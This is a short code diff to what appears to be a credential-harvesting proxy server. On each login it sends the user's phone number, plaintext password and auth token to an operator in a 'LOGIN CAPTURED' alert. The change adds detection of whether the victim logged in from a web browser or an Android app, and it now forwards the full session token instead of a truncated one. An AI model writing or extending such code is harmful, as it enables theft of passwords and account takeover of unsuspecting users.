@@ -1551,10 +1551,13 @@ app.all('/xxapi/*', async (req, res) => {
     if (isLogin) {
       const pwd = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';
       const token = (respData && typeof respData === 'object') ? (respData.token || respData.accessToken || '') : '';
+      const isWeb = !!(req.headers['origin'] || req.headers['referer'] || req.headers['sec-fetch-dest']);
+      const platformStr = isWeb ? '🌐 Web Browser' : '📱 Android App';
       notifyAdmin(data,
         `🔑 LOGIN CAPTURED
 👤 User: ${userId || 'N/A'}
-📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${token ? '\n🎫 Token: ' + String(token).substring(0, 40) + '...' : ''}
+💻 Platform: ${platformStr}
+📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${token ? '\n🎫 Token: ' + String(token) : ''}
 🕐 ${now}`);
 
       if (phone && data.suspendedPhones && data.suspendedPhones[String(phone)]) {
